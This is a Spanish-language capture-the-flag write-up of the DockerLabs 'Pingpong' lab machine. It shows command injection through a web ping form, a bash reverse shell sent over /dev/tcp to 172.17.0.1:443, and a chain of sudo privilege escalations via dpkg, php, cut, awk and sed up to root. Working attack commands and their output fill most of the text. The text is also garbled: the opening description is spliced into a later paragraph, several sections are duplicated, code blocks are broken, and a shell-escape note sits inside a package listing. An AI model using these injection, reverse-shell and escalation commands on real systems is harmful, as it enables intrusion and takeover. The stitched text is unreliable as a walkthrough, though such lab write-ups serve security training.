# Laboratorio Pingpong

## Descripción
Writeup del laboratorio **Pingpong** de DockeEfectivamente podemos abusar del sistema de ping, procederemos a hacer una búsqueda profunda para encontrar algún archivo comprometedor.

Haciendo una búsqueda en el directorio raíz con `ls -la` podemos encontrar que en el directorio `/etc` podemos encontrar bastantes archivos interesantes, entre esos "passwd":

```
localhost && cd /etc && ls -la - Dificultad: Medium

## Reconocimiento

### Inicialización del laboratorio
Inicializamos el laboratorio Pingpong con el comando:
```bash
./auto_deploy.sh pingpong.tar
```

### Escaneo de puertos
Realizamos un escaneo completo de puertos con nmap:

```bash
nmap -p- -sS -sV -T5 -n -Pn -oX reporte_pingpong 172.17.0.2
```

Originalmente se usaría -T1 (Sneaky) pero por motivo de optimización se usó -T5.

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 14:48 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
5000/tcp open  http     Werkzeug httpd 3.0.1 (Python 3.12.3)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.77 seconds
```

### Resultados del escaneo
Vemos los puertos **80**, **443** y **5000** abiertos.

## Explotación Web

### Reconocimiento web inicial
Al explorar el puerto 5000 podemos ver que tiene un apartado de ping, el cual aparentemente actúa insertando tal cual los parámetros del campo al comando de la máquina víctima.

```
Entrada -> localhost

PING localhost (::1) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.127 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.112 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.081 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.075 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3036ms
rtt min/avg/max/mdev = 0.075/0.098/0.127/0.021 ms
```

### Inyección de comandos
Ahora probaremos si concatenando con un AND podemos abusar del sistema:

```
Entrada -> localhost && ls

PING localhost (::1) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.127 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.112 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.081 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.075 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3036ms
rtt min/avg/max/mdev = 0.075/0.098/0.127/0.021 ms
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

Efectivamente podemos abusar del sistema de ping, procederemos a hacer una búsqueda profunda para encontrar algún archivo comprometedor.

Haciendo una busqueda en el directorio raiz con ls -la podemos encontrar que en el directorio /etc podemos encontrar bastantes archivos interesantes, entre esos "passwd"

localhost && cd /etc && ls -la

```
PING localhost (::1) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.063 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.060 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.086 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.129 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3037ms
rtt min/avg/max/mdev = 0.060/0.084/0.129/0.027 ms
total 532

-rw-r--r-- 1 root root    1113 May 19  2024 passwd
-rw-r--r-- 1 root root    1068 May 19  2024 passwd-
```

Luego al hacer un `cat` podemos encontrar varios de los usuarios que se encuentran en el sistema.

```
localhost && cat /etc/passwd
```

```
PING localhost (::1) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.081 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.071 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.088 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.151 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3040ms
rtt min/avg/max/mdev = 0.071/0.097/0.151/0.031 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
freddy:x:1001:1001::/home/freddy:/bin/bash
bobby:x:1002:1002::/home/bobby:/bin/bash
gladys:x:1003:1003::/home/gladys:/bin/bash
chocolatito:x:1004:1004::/home/chocolatito:/bin/bash
theboss:x:1005:1005::/home/theboss:/bin/bash
```

### Obtención de reverse shell
Empecemos mandando una reverse shell a nuestra máquina para entrar con el usuario freddy, así que pongamos a escuchar a nuestra máquina en el puerto 443:

```bash
# En nuestra máquina host
sudo nc -lnvp 443
```

Y desde el sistema mandamos lo siguiente:

```
localhost && bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
```

## Escalada de Privilegios

### Mejora del TTY
Ahora haremos la mejora del TTY:

```bash
script /dev/null -c bash
# Ctrl + Z (para suspender la terminal)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
reset
```

### Enumeración de privilegios
Ahora dentro del usuario freddy veremos los binarios con sudo -l:
```

### Mejora del TTY
Ahora haremos la mejora del TTY:

```bash
script /dev/null -c bash
# Ctrl + Z (para suspender la terminal)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
reset
```

Ahora adentro del usuario freddy veremos los binarios con sudo -l

```
Matching Defaults entries for freddy on dc2e2a443b14:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User freddy may run the following commands on dc2e2a443b14:
    (bobby) NOPASSWD: /usr/bin/dpkg
```

### Escalada horizontal con dpkg
Ahora de acuerdo a la documentación en [GTFOBins - dpkg](https://gtfobins.github.io/gtfobins/dpkg/) ejecutaremos dpkg -l como bobby:

```bash
sudo -u bobby /usr/bin/dpkg -l
```

```
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                            Version                           Architectu
re Description
+++-===============================-=================================-==========
==-=============================================================================
===
ii  adduser                         3.137ubuntu1                      all       
   add and remove users and groups
ii  apache2                         2.4.58-1ubuntu8.1                 amd64     
   Apache HTTP Server
ii  apache2-bin                     2.4.58-1ubuntu8.1                 amd64     
   Apache HTTP Server (modules and other binary files)
ii  apache2-data                    2.4.58-1ubuntu8.1                 all       
   Apache HTTP Server (common files)
ii  apache2-utils                   2.4.58-1ubuntu8.1                 amd64     
   Apache HTTP Server (utility programs for web servers)
ii  apt                             2.7.14build2                      amd64     
   commandline package manager
ii  base-files                      13ubuntu10                        amd64     
   Debian base system miscellaneous files
ii  base-passwd                     3.6.3build1                       amd64     
!/bin/bash  <--- Este es el comando que usamos para que nos regrese a la terminal del ejecutor del comando (!/bin/(shell)), recordemos que tenemos que estar en una terminal interactiva
```

Ahora listaremos los binarios con bobby:

```bash
sudo -l
```

```
Matching Defaults entries for bobby on dd48815f6cfb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User bobby may run the following commands on dd48815f6cfb:
    (gladys) NOPASSWD: /usr/bin/php
```

### Escalada con PHP
Ahora usando nuevamente la documentación en [GTFOBins - php](https://gtfobins.github.io/gtfobbins/php/) ejecutaremos php con Gladys:

```bash
sudo -u gladys /usr/bin/php -r "system('/bin/bash');"
```

### Continuando la escalada con Gladys
Ahora que estamos con el usuario gladys veremos nuevamente el listado de binarios:

```bash
sudo -l
```

```bash
sudo -l
```

```
Matching Defaults entries for gladys on dd48815f6cfb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User gladys may run the following commands on dd48815f6cfb:
    (chocolatito) NOPASSWD: /usr/bin/cut
```

### Escalada con cut
Luego de ir a la herramienta de binarios, podremos encontrar que necesitamos un archivo, así que exploraremos los directorios de gladys a ver qué encontramos.

En este caso en el directorio `/opt` se encontró un archivo llamado `chocolatitocontraseña.txt`:

```bash
gladys@dd48815f6cfb:/$ cd /opt
gladys@dd48815f6cfb:/opt$ ls
chocolatitocontraseña.txt
gladys@dd48815f6cfb:/opt$ cat chocolatitocontraseña.txt 
cat: chocolatitocontraseña.txt: Permission denied
gladys@dd48815f6cfb:/opt$ LFILE=chocolatitocontraseña.txt 
gladys@dd48815f6cfb:/opt$ sudo -u chocolatito /usr/bin/cut -d "" -f1 "$LFILE"
chocolatitopassword
```

### Escalada a chocolatito
Podemos ver que la contraseña es `chocolatitopassword`, así que ahora haremos login con chocolatito:

```bash
su chocolatito
Password: chocolatitopassword
```

Ahora listamos nuevamente los binarios con chocolatito:

```bash
sudo -l
```

```
Matching Defaults entries for chocolatito on dd48815f6cfb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User chocolatito may run the following commands on dd48815f6cfb:
    (theboss) NOPASSWD: /usr/bin/awk
```

### Escalada con awk
Nuevamente usamos la herramienta de los binarios y abusamos del sistema:

```bash
sudo -u theboss /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

Ahora nuevamente listamos los binarios para ver qué tenemos con el usuario theboss:

```bash
```bash
sudo -l
```

```
Matching Defaults entries for theboss on dd48815f6cfb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User theboss may run the following commands on dd48815f6cfb:
    (root) NOPASSWD: /usr/bin/sed
```

### Escalada final con sed
Y nuevamente recurrimos a la herramienta de los binarios:

```bash
sudo -u root /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
```

Nos saldrá un `#` lo cual es buena noticia.

Le damos `whoami` y confirmamos que somos root:

```bash
whoami
# root
```

## Conclusión

**Máquina completada exitosamente**

### Resumen de la explotación:
1. **Reconocimiento:** Escaneo de puertos con nmap
2. **Inyección de comandos:** Explotación de vulnerabilidad en sistema de ping
3. **Reverse shell:** Obtención de acceso inicial mediante inyección de comandos
4. **Enumeración:** Identificación de cadena de usuarios con privilegios sudo
5. **Escalada horizontal:** Explotación de múltiples binarios con sudo
   - **dpkg** para acceder como bobby
   - **php** para acceder como gladys  
   - **cut** para obtener credenciales y acceder como chocolatito
   - **awk** para acceder como theboss
6. **Escalada final:** Uso de **sed** para obtener privilegios de root

### Vulnerabilidades identificadas:
- Inyección de comandos en funcionalidad de ping
- Configuración insegura de sudo para múltiples binarios
- Archivos de credenciales en texto plano accesibles
- Cadena de privilegios mal configurada

### Técnicas utilizadas:
- **Command Injection** en aplicación web
- **Reverse Shell** mediante bash
- **Privilege Escalation** con binarios SUID/sudo
- **GTFOBins** para explotación de binarios privilegiados

---

**Fecha:** 18 de Septiembre de 2025  
**Dificultad:** Medium  
**Plataforma:** DockerLabs


